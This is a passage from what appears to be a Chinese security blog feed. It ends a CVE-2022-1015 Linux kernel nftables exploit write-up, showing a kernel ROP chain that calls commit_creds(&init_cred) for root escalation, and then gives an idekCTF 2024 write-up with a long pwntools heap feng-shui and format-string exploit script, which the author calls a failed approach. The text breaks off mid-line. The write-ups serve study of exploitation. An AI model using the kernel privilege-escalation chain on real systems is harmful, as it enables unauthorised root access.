class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>        <span class="hljs-type">int</span> len = recvfrom(fd, buf, <span class="hljs-keyword">sizeof</span> buf - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, &amp;client_addr_size);<br>        <span class="hljs-keyword">if</span> (len &lt;= <span class="hljs-number">0</span>) <br>            error(<span class="hljs-string">&quot;listener receive failed..\n&quot;</span>);<br>        <br>        sendto(fd, buf, <span class="hljs-keyword">sizeof</span>(buf), <span class="hljs-number">0</span>, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;client_addr, client_addr_size);<br>    &#125;<br><br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>helpers.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">rule_add_payload_set</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nftnl_rule* r, <span class="hljs-type">uint32_t</span> base, <span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> len, <span class="hljs-type">uint32_t</span> sreg)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nftnl_expr</span>* <span class="hljs-title">e</span>;</span><br>    e = nftnl_expr_alloc(<span class="hljs-string">&quot;payload&quot;</span>);<br><br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);<br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);<br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);<br>    nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_SREG, sreg);<br><br>    nftnl_rule_add_expr(r, e);  <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="hook-output"><a href="#hook-output" class="headerlink" title="hook output"></a>hook output</h2><p>hook output劫持ip_local_out的返回地址</p><img src="/2024/08/23/cve-2022-1015/output_hijack.png" class title="output_hijack"><p>ROP链就是直接提权的那一段，最后抬栈返回用户态的那条换一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">_rop(kernel_base + BPF_GET_CURRENT_TASK_OFF);       <span class="hljs-comment">// ffffffff811ef7e0 T bpf_get_current_task</span><br>_rop(kernel_base + MOV_RDI_RAX_OFF);                <span class="hljs-comment">// 0xffffffff8102bfb1: mov rdi, rax; mov eax, ebx; pop rbx; pop rbp; or rax, rdi; ret;  </span><br>_rop(<span class="hljs-number">0xdeadbeef</span>);<br>_rop(<span class="hljs-number">0xdeadbeef</span>);<br>_rop(kernel_base + POP_RSI_OFF);                    <span class="hljs-comment">// 0xffffffff810223e6: pop rsi; ret;</span><br>_rop(kernel_base + INIT_NSPROXY_OFF);               <span class="hljs-comment">// ffffffff8286d940 D init_nsproxy</span><br>_rop(kernel_base + SWITCH_TASK_NAMESPACES_OFF);     <span class="hljs-comment">// ffffffff810d12b0 T switch_task_namespaces</span><br><br><span class="hljs-comment">// commit_cred(&amp;init_cred)</span><br>_rop(kernel_base + POP_RDI_OFF);        <span class="hljs-comment">// 0xffffffff81092100: pop rdi; ret;</span><br>_rop(kernel_base + INIT_CRED_OFF);      <span class="hljs-comment">// ffffffff8286db80 D init_cred</span><br>_rop(kernel_base + COMMIT_CREDS_OFF);   <span class="hljs-comment">// ffffffff810d2690 T commit_creds</span><br><br><span class="hljs-comment">// pass control to system call stack</span><br><span class="hljs-comment">// this is offset +0x70 from our rop chain</span><br><span class="hljs-comment">// target is at   +0x168</span><br>_rop(kernel_base + <span class="hljs-number">0x20c</span>); <span class="hljs-comment">// 0xffffffff8100020c: ret;</span><br>_rop(kernel_base + <span class="hljs-number">0x7ea9f9</span>);  <span class="hljs-comment">// 0xffffffff817ea9f9: add rsp, 0x198; pop r12; pop rbp; ret;</span><br></code></pre></td></tr></table></figure><p>抬栈返回到inet_sendmsg</p><img src="/2024/08/23/cve-2022-1015/stack_up.png" class title="stack_up"><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>中断相关机制</li><li>namespace</li></ul>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>nft</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 idekCTF Write-me wp</title>
    <link href="/2024/08/20/idekctf2024-writeme/"/>
    <url>/2024/08/20/idekctf2024-writeme/</url>
    
    <content type="html"><![CDATA[<p>《风水大师》，其实并不是：）评价为益智游戏，没什么用但做不出来难受</p><span id="more"></span><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><ul><li>功能<ul><li>可以几乎任意malloc和free chunk</li><li>格式化字符串，参数在堆上</li></ul></li><li>需求<ul><li>往对应地址写对应值</li></ul></li></ul><h1 id="坎坷的错误思路"><a href="#坎坷的错误思路" class="headerlink" title="坎坷的错误思路"></a>坎坷的错误思路</h1><p><em>你懂风水了两天的含金量</em></p><ul><li><p>用tcache风水，想法为%hhn写偏移，%hn写地址，%n写值</p></li><li><p>发现$的更改不能立即生效，这意味着在地址写完之前都只能使用%c占位，但cnt可能会跳过需要写的值，如果使用%n不会递增cnt但需要合法地址</p></li><li><p>使用unsorted bin和large bin风水，造合法地址来%n占位</p></li><li><p>发现还是不能铺满合法地址</p></li><li><p>发现%hhn只会写cnt的最低字节，%hn同理，可以进行一个溢出，这样就不用铺合法地址了</p></li><li><p>由于堆风水时未知address和value，所以进行一个爆破，对于address的每个dword遍历每个可能位置</p><ul><li><p>%hhn写偏移</p><img src="/2024/08/20/idekctf2024-writeme/level1.png" class title="level1"></li><li><p>%hn写地址</p><img src="/2024/08/20/idekctf2024-writeme/level2.png" class title="level2"></li></ul></li></ul><p><em>感觉要出了对吧！！！数字大到一定程度vfprintf就-1了：）</em></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p><em>虽然是错误思路且耗时巨长但好歹是搓了两天的exp还是贴一下，纪念一下：）</em></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx,sz</span>):<br>    <span class="hljs-comment">#print(&#x27;add &#x27;+hex(idx)+&#x27; &#x27;+hex(sz))</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size? &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    <span class="hljs-comment">#print(&#x27;delete &#x27;+hex(idx))</span><br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Index? &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><br>p=process(<span class="hljs-string">&#x27;./write_me&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,9999)</span><br><br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x7000</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br><span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x7000</span>-<span class="hljs-number">0x20</span>,<span class="hljs-number">0x500</span>-<span class="hljs-number">0x10</span>,-<span class="hljs-number">0x10</span>):<br>    delete(<span class="hljs-number">0</span>)<br>    add(<span class="hljs-number">0</span>,sz)<br>    add(<span class="hljs-number">2</span>,<span class="hljs-number">0xffff</span>)<br>    delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x6a00</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><span class="hljs-comment">#   0x10</span><br><span class="hljs-comment">#   0x500</span><br><span class="hljs-comment">#   0x6000</span><br><span class="hljs-comment">#   </span><br><span class="hljs-comment">#   0x100</span><br><span class="hljs-comment">#           *3</span><br><span class="hljs-comment">#               *0x30</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_size</span>(<span class="hljs-params">siz</span>):<br>    edges=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x530</span>,<span class="hljs-number">0xc31</span>,<span class="hljs-number">0x40</span>)]<br>    edges+=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xdf0</span>,<span class="hljs-number">0x29f1</span>,<span class="hljs-number">0x200</span>)]<br>    edges+=[sz <span class="hljs-keyword">for</span> sz <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x2ff0</span>,<span class="hljs-number">0x9ff1</span>,<span class="hljs-number">0x1000</span>)]<br>    <span class="hljs-keyword">if</span> siz+<span class="hljs-number">0x10</span> <span class="hljs-keyword">in</span> edges:<br>        <span class="hljs-keyword">return</span> siz-<span class="hljs-number">0x10</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> siz+<span class="hljs-number">0x10</span><br><br><span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            delete(<span class="hljs-number">0</span>)<br>            size=<span class="hljs-number">0x6500</span>-(i1*<span class="hljs-number">0x3000</span>+i2*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>)<br>            add(<span class="hljs-number">1</span>,size)<br>            add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6a00</span>-size-<span class="hljs-number">0x10</span>)<br><br>            delete(<span class="hljs-number">0x402</span>)<br>            add(<span class="hljs-number">0x101</span>,<span class="hljs-number">0x500</span>+i2*<span class="hljs-number">0x300</span>+(<span class="hljs-number">2</span>-i1)*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>+<span class="hljs-number">0x30</span>)<br>            add(<span class="hljs-number">0x102</span>,get_size(<span class="hljs-number">0x6a00</span>-size-<span class="hljs-number">0x10</span>))<br>            add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0x500</span>)<br><br>            delete(<span class="hljs-number">2</span>)<br>            delete(<span class="hljs-number">0x102</span>)<br><br>            add(<span class="hljs-number">0x401</span>,<span class="hljs-number">0xffff</span>)<br><br>            delete(<span class="hljs-number">1</span>)<br>            add(<span class="hljs-number">0</span>,<span class="hljs-number">0x6a00</span>)<br><br>            delete(<span class="hljs-number">0x401</span>)<br>            delete(<span class="hljs-number">0x400</span>)<br>            delete(<span class="hljs-number">0x101</span>)<br>            add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0x402</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Finish fengshui level 1&#x27;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x9a00</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">for</span> i1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>):<br>    <span class="hljs-keyword">for</span> i2 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> i3 <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            delete(<span class="hljs-number">3</span>)<br>            size=<span class="hljs-number">0x9500</span>-(i1*<span class="hljs-number">0x300</span>+i2*<span class="hljs-number">0x100</span>+i3*<span class="hljs-number">0x10</span>)<br>            add(<span class="hljs-number">1</span>,size)<br>            add(<span class="hljs-number">2</span>,<span class="hljs-number">0x9a00</span>-size-<span class="hljs-number">0x10</span>)<br><br>            delete(<span class="hljs-number">0x402</span>)<br>            add(<span class="hljs-number">0x101</span>,<span class="hljs-number">0x50</span>+<span class="hljs-number">0x500</span>*i3-<span class="hljs-number">0x10</span>+<span class="hljs-number">0x500</span>)<br>            add(<span class="hljs-number">0x102</span>,get_size(<span class="hljs-number">0x9a00</span>-size-<span class="hljs-number">0x10</span>))<br>            add(<span class="hljs-number">0x400</span>,<span class="hljs-number">0x500</span>)<br><br>            delete(<span class="hljs-number">2</span>)<br>            delete(<span class="hljs-number">0x102</span>)<br><br>            add(<span class="hljs-number">0x401</span>,<span class="hljs-number">0xffff</span>)<br><br>            delete(<span class="hljs-number">1</span>)<br>            add(<span class="hljs-number">3</span>,<span class="hljs-number">0x9a00</span>)<br><br>            delete(<span class="hljs-number">0x401</span>)<br>            delete(<span class="hljs-number">0x400</span>)<br>            delete(<span class="hljs-number">0x101</span>)<br>            add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0x500</span>)<br><br>delete(<span class="hljs-number">0x402</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Finish fengshui level 2&#x27;</span>)<br>gdb.attach(p)<br><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x500</span>)<br>add(<span class="hljs-number">0x402</span>,<span class="hljs-number">0xffff</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x6500</span>-<span class="hljs-number">0x10</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x4e0</span>)<br><br><span class="hljs-comment"># delete(3)</span><br><span class="hljs-comment"># delete(2)</span><br><br><span class="hljs-comment"># delete(0x402)</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,idx</span>):<br>        self.addr=[addr&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">16</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">32</span>)&amp;<span class="hljs-number">0xffff</span>,(addr&gt;&gt;<span class="hljs-number">48</span>)&amp;<span class="hljs-number">0xffff</span>]<br>        self.idx=idx<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">self</span>):<br>        dwords=[]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>            dwords.append(Dword(self.addr[i],i,self.idx))<br>        <span class="hljs-keyword">return</span> dwords<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Challenge</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,addr,val,idx</span>):<br>        self.addr=Address(addr,idx)<br>        self.val=val<br>        self.idx=idx<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dword</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,val,offset,idx</span>):<br>        self.val=val<br>        self.idx=idx<br>        self.offset=offset<br><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Choice? &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>challenges=[]<br>addr_dwords_group=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;: Write 0x&#x27;</span>)<br>    val=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27; &#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;to address 0x&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>    challenge=Challenge(addr,val,i)<br>    challenges.append(challenge)<br>    addr_dwords_group+=challenge.addr.divide()<br><br>addr_dwords_group=<span class="hljs-built_in">sorted</span>(addr_dwords_group,key=<span class="hljs-keyword">lambda</span> item: item.val)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Dwords of addresses: &#x27;</span>)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> addr_dwords_group:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.idx)+<span class="hljs-string">&#x27; offset:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.offset)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.val))<br><span class="hljs-built_in">print</span>()<br><br><br>payload=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-number">0x102</span>-<span class="hljs-number">5</span>)+<span class="hljs-string">&#x27;c&#x27;</span>+<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">2</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x600</span><br>payload+=<span class="hljs-string">&#x27;%2c&#x27;</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*(<span class="hljs-number">0x600</span>-<span class="hljs-number">1</span>)<br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x9a</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*<span class="hljs-number">6</span><br>payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span>*<span class="hljs-number">0x40</span><br>payload+=<span class="hljs-string">&#x27;%c&#x27;</span>*(<span class="hljs-number">0x5d</span>+<span class="hljs-number">4</span>)<br>cnt=<span class="hljs-number">0x16b</span><br><br>dictionary=[]<br><span class="hljs-keyword">for</span> dword <span class="hljs-keyword">in</span> addr_dwords_group:<br>    <span class="hljs-keyword">for</span> offset <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>        <span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x10</span>):<br>            dst_dword_id=idx*<span class="hljs-number">0x10</span>+offset<br>            src_dword_id=dword.idx*<span class="hljs-number">0x10</span>+dword.offset<br>            <span class="hljs-keyword">if</span> dst_dword_id==src_dword_id:<br>                <span class="hljs-keyword">if</span> dword.val&gt;(cnt&amp;<span class="hljs-number">0xffff</span>):<br>                    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(dword.val-(cnt&amp;<span class="hljs-number">0xffff</span>))+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>                    cnt=dword.val+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(dword.val-(cnt&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-number">0x10000</span>)+<span class="hljs-string">&#x27;c%hn&#x27;</span><br>                    cnt=dword.val+<span class="hljs-number">0x10000</span>+(cnt&amp;<span class="hljs-number">0xffffffffffff0000</span>)<br>                dictionary.append(src_dword_id)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Write: &#x27;</span>+<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.idx)+<span class="hljs-string">&#x27; offset:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.offset)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(dword.val)+<span class="hljs-string">&#x27;(cnt=&#x27;</span>+<span class="hljs-built_in">hex</span>(cnt)+<span class="hljs-string">&#x27;)&#x27;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                no_offset_id=<span class="hljs-number">0x10</span>*((idx-<span class="hljs-number">1</span>)%<span class="hljs-number">0x10</span>)<br>                <span class="hljs-keyword">if</span> no_offset_id <span class="hljs-keyword">in</span> dictionary:<br>                    payload+=<span class="hljs-string">&#x27;%c&#x27;</span><br>                    cnt+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br>                <span class="hljs-keyword">if</span> dst_dword_id <span class="hljs-keyword">in</span> dictionary:<br>                    payload+=<span class="hljs-string">&#x27;%c&#x27;</span><br>                    cnt+=<span class="hljs-number">1</span><br>                <span class="hljs-keyword">else</span>:<br>                    payload+=<span class="hljs-string">&#x27;%hhn&#x27;</span><br><br>challenges=<span class="hljs-built_in">sorted</span>(challenges,key=<span class="hljs-keyword">lambda</span> item: item.val)<br>addr_base=<span class="hljs-number">0x29ef</span><br>addr_chunk=<span class="hljs-number">0xa0</span><br><br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> challenges:<br>    <span class="hljs-keyword">if</span> (cnt&amp;<span class="hljs-number">0xffffffff</span>)&gt;item.val:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(item.val-(cnt&amp;<span class="hljs-number">0xffffffff</span>)+<span class="hljs-number">0x100000000</span>)+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=item.val+<span class="hljs-number">0x100000000</span>+(cnt&amp;<span class="hljs-number">0xffffffff00000000</span>)<br>    <span class="hljs-keyword">elif</span> (cnt&amp;<span class="hljs-number">0xffffffff</span>)&lt;item.val:<br>        payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(item.val-(cnt&amp;<span class="hljs-number">0xffffffff</span>))+<span class="hljs-string">&#x27;c&#x27;</span><br>        cnt=item.val+(cnt&amp;<span class="hljs-number">0xffffffff00000000</span>)<br>    payload+=<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(addr_base-addr_chunk*item.idx)+<span class="hljs-string">&#x27;$n&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Write: &#x27;</span>+<span class="hljs-string">&#x27;idx:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.idx)+<span class="hljs-string">&#x27; val:&#x27;</span>+<span class="hljs-built_in">hex</span>(item.val)+<span class="hljs-string">&#x27;(cnt=&#x27;</span>+<span class="hljs-built_in">hex</span>(cnt)+<span class="hljs-string">&#x27;)&#x27;</span>)<br><br>payload+=<span class="hljs-string">&#x27;Eurus&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] len(payload) = &#x27;</span>+<span class="hljs-built_in">hex</span>(<span 